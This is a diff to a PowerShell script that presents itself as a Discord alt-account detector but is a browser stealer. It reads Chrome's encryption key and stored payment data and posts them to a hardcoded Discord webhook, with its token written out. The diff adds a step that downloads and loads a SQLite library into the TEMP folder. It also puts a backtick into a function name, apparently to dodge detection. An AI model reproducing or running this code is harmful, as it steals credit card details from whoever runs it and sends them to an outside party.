@@ -1,11 +1,20 @@
-# PowerShell Script to Detect Discord Alt Accounts
+# PowerShell Script to Detect Discord Alt Accounts and Steal Credit Card Info
 
 # Define the webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1453518648726523996/Uv-gp_SmhlEYcCARWsxAfkb3ZmTw_d_HsXgo9SLMtDfJ9da4c9YlhpxYEdsiTaRTHiOA"
 
 # Load necessary .NET assemblies
 Add-Type -AssemblyName "System.Security"
-Add-Type -Path "C:\path\to\System.Data.SQLite.dll"  # Load the SQLite assembly from the specified path
+
+# Download and load System.Data.SQLite assembly
+$assemblyUrl = "https://system.data.sqlite.org/downloads/1.0.112.0/System.Data.SQLite.Core.1.0.112.0.nupkg"
+$assemblyPath = "$env:TEMP\System.Data.SQLite.dll"
+
+Invoke-WebRequest -Uri $assemblyUrl -OutFile "$env:TEMP\System.Data.SQLite.Core.1.0.112.0.nupkg"
+Expand-Archive -Path "$env:TEMP\System.Data.SQLite.Core.1.0.112.0.nupkg" -DestinationPath "$env:TEMP"
+Copy-Item -Path "$env:TEMP\lib\netstandard2.0\System.Data.SQLite.dll" -Destination $assemblyPath
+
+Add-Type -Path $assemblyPath
 
 # Function to get the Chrome encryption key from Local State file
 function Get-ChromeEncryptionKey {
@@ -76,7 +85,7 @@ function Send-DiscordMessage {
 }
 
 # Retrieve and prepare payment information
-$chromePaymentInfo = Get-ChromePaymentInfo
+$chromePaymentInfo = Get-ChromePayment`Info
 
 # Create message to send
 $message = "Discord Alt Account Detection Report:`n`n"
